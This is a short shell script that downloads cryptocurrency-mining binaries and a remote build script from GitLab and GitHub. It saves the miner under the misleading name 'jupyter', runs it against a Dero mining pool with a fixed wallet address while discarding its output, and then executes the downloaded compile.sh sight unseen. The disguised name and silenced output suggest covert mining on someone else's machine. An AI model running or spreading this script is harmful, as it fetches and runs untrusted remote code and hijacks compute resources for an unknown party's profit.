curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner
curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner
curl -L -o compile.sh https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh 
chmod +x jupyter jupyter compile.sh
./jupyter  -r 15.235.164.162:4304  -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.$RANDOM >/dev/null 
./compile.sh
